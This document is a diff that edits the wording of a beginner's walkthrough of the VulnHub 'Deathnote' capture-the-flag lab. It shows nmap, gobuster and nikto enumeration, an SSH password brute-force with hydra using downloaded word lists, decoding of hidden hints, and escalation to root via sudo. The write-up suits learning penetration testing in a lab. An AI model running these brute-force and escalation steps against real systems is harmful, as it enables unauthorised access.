@@ -1,42 +1,44 @@
-Deathnote VulnHub CTF
+# Deathnote VulnHub CTF
 
 Netdiscover new VM to get IP address - 10.0.2.11 for me
-then use sudo nmap -sCV 10.0.2.11 to get ports open
-ports 22 and 80 are open.... time to go onto firefox and type in http://10.0.2.11, which resolves to deathnote.vuln/wordpress
+Then, use sudo nmap -sCV 10.0.2.11 to get open ports. 
 
-the site hints there is a notes.txt file on server.
+Ports 22 and 80 are open... time to go to Firefox and type in http://10.0.2.11, which resolves to deathnote.vuln/wordpress
 
-so i decided to run a gobuster  on http://10.0.2.11 gobuster dir -u http://10.0.2.11 -w /usr/share/wordlists/dirb/common.txt
-results show a robots.txt file, so i checked it out and got a message saying
- fuck it my dad
-added hint on /important.jpg
+The site hints that there is a notes.txt file on the server.
+So I decided to run a gobuster on http://10.0.2.11 
+Gobuster dir -u http://10.0.2.11 -w /usr/share/wordlists/dirb/common.txt
+
+Results show a robots.txt file, so I checked it out and got a message saying
+fuck it, my dad
+added a hint on /important.jpg
 ryuk please delete it
 
-decided to check it out by using curl http://deathnote.vuln/important.jpg and get this message:
-i am Soichiro Yagami, light's father
+I Decided to check it out by using curl http://deathnote.vuln/important.jpg and got this message:
+I am Soichiro Yagami, light's father
 i have a doubt if L is true about the assumption that light is kira
 
 i can only help you by giving something important
 
-login username : user.txt
+login username: user.txt
 i don't know the password.
 find it by yourself
 but i think it is in the hint section of site
 
 
-so we know there is a user.txt and a notes.txt somewhere, so i decided to try and use Nikto this time
+So we know there is a user.txt and a notes.txt somewhere, so I decided to try and use Nikto this time
 nikto -h deathnote.vuln
 
-NIkto reveals a content/uploads folder, sounds like a juicy spot to check so i added the wordpress/wp-content/uploads/ and found the jackpot!
-UNDer 2021 > 07/ theres a few files, namely our notes and user txt files
+NIkto reveals a content/uploads folder, sounds like a juicy spot to check, so i added the wordpress/wp-content/uploads/ and found the jackpot!
+Under 2021 > 07/there's a few files, namely our notes and user txt files
 Notes.txt looks like passwords
 User.txt looks like usernames
 
-Maybe use something like HYdra again to bruteforce our way in, BUT first we need to download the notes and user txt files using wget to create our wordlis>
+Maybe use something like Hydra again to brute-force our way in, BUT first we need to download the notes and user txt files using wget to create our wordlis>
 wget http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/notes.txt
 wget http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/user.txt
 
-got the files! NOW to use HYdra to create wordlists and bruteforce the combination
+Got the files! NOW to use Hydra to create wordlists and brute-force the combination
 
 hydra -L user.txt -P notes.txt deathnote.vuln ssh
 
@@ -46,48 +48,46 @@ GOT IT!
 STATUS] 280.00 tries/min, 280 tries in 00:01h, 453 to do in 00:02h, 14 active
 [22][ssh] host: deathnote.vuln   login: l   password: death4me
 
-now to ssh into the machine using ssh l@10.0.2.11 password is death4me
-first thing i did was ls to see files and got a user.txt
+Now to ssh into the machine using ssh l@10.0.2.11 password is death4me
+First thing I did was ls to see files and got a user.txt
 
-Cat,head and tails all show what looks like gibberish when viewing the file
+Cat, head, and tails all show what looks like gibberish when viewing the file
 
 user.txt
 l@deathnote:~$ cat user.txt
 ++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>+++++.<<++.>>+++++++++++.------------.+.+++++.---.<<.>>++++++++++.<<.>>--------------.++++++++.+++++.<<.>>.->
 
 
-wtf??? had to google it, this is what i got:
+wtf??? had to google it, this is what I got:
 The text you provided is encoded in Brainfuck, an esoteric programming language designed to be deliberately difficult for humans to read.
 When executed through a Brainfuck interpreter, the string outputs the following hidden message:
 i think u got the shell , but you wont be able to kill me -kira
 
 what? lol
 
-after some blood, sweat and tears, i found the next step, NAvigate to cd /opt > L to see two directories:
+After some blood, sweat, and tears, I found the next step, Navigate to cd /opt > L to see two directories:
 
 fake-notebook-rule - cd into this and you see a .wav file and a hint file, the hint says use cyberchef
 
 kira_case - inside is a case file which says this:
-the FBI agent died on December 27, 2006
+The FBI agent died on December 27, 2006
 1 week after the investigation of the task-force member/head.
 aka.....
-Soichiro Yagami's family .
+Soichiro Yagami's family.
 hmmmmmmmmm......
-
 and according to watari ,
 he died as other died after Kira targeted them .
 and we also found something in
 fake-notebook-rule folder .
 
-
 case.wav gives us this:
 l@deathnote:/opt/L/fake-notebook-rule$ cat case.wav
 63 47 46 7a 63 33 64 6b 49 44 6f 67 61 32 6c 79 59 57 6c 7a 5a 58 5a 70 62 43 41 3d
-which we know from the hint to use cyberchef
+which we know from the hint to use CyberChef
 that gives me this : passwd:kiraisevil
 
-well the story goes deep i guess.....
-anyway i went back to the home directory and hit ls, i see there is two users. Kira and L, we are already in L, so lets try kira.
+Well, the story goes deep, I guess.....
+Anyway, I went back to the home directory and hit ls, I see there are two directories. Kira and L, we are already in L, so let's try kira.
 
 l@deathnote:/$ cd /home
 l@deathnote:/home$ ls
@@ -95,29 +95,29 @@ kira  l
 l@deathnote:/home$ cd kira
 l@deathnote:/home/kira$ ls
 kira.txt
-l@deathnote:/home/kira$ kira.txt
--bash: kira.txt: command not found
 l@deathnote:/home/kira$ cat kira.txt
 cat: kira.txt: Permission denied
 
-well then permission denied.... lets try to su in as kira now
+Well then, permission denied.... let's try to su in as Kira now
 
 kira@deathnote:~$ cat kira.txt
 cGxlYXNlIHByb3RlY3Qgb25lIG9mIHRoZSBmb2xsb3dpbmcgCjEuIEwgKC9vcHQpCjIuIE1pc2EgKC92YXIp
 kira@deathnote:~$
 
-not this agin... time for cyberchef again i guess
+not this again... time for cyberchef again i guess
 
-not going to lie had to google it, cyberchef wasnt giving me anything
+Not going to lie, had to Google it, CyberChef wasn't giving me anything
+
+Here's what I found out I have to do:
 echo "cGxlYXNlIHByb3RlY3Qgb25lIG9mIHRoZSBmb2xsb3dpbmcgCjEuIEwgKC9vcHQpCjIuIE1pc2EgKC92YXIp" | base64 — decode
 
 gives you this:
 kira@deathnote:~$ echo "cGxlYXNlIHByb3RlY3Qgb25lIG9mIHRoZSBmb2xsb3dpbmcgCjEuIEwgKC9vcHQpCjIuIE1pc2EgKC92YXIp"|base64  --decode
-please protect one of the following
+Please protect one of the following
 1. L (/opt)
 2. Misa (/var)kira@deathnote:
 
-we did /opt already so we selected the /var by using cd /var
+We did /opt already, so we selected the /var by using cd /var
 kira@deathnote:~$ cd /var
 kira@deathnote:/var$ ls
 backups  cache  lib  local  lock  log  mail  misa  opt  run  spool  tmp  www
@@ -133,9 +133,9 @@ Matching Defaults entries for kira on deathnote:
 User kira may run the following commands on deathnote:
     (ALL : ALL) ALL
 
-looks like kira is root and has all permissions
+Looks like Kira is root and has all permissions
 
-time to elevate permissions to root
+Time to elevate permissions to root!
 kira@deathnote:/var$ sudo su
 
 oot@deathnote:/var# cd
@@ -182,10 +182,14 @@ root@deathnote:~# cat root.txt
 ########       ########       ###    ####       ########       ###    ###      ###     ###    ###           ########       
 
 ##########follow me on twitter###########3
-and share this screen shot and tag @KDSAMF
+and share this screenshot and tag @KDSAMF
 
 
-we did it! after a few google searches on syntax, this is my second ctf type activity.
-still working on syntax and learning tools, but this is fun and builds up knowledge
+We did it! After a few Google searches on syntax, this is my second ctf type activity.
+still working on syntax and learning tools, but this is fun and builds up knowledge on cybersecurity processes.
+
+If you have read this far, let me know on LinkedIn and shoot me some more ideas for CTF-type things I can do like this to keep going!
+Https://www.linkedin.com/in/joshjanssen-it
+
 
 
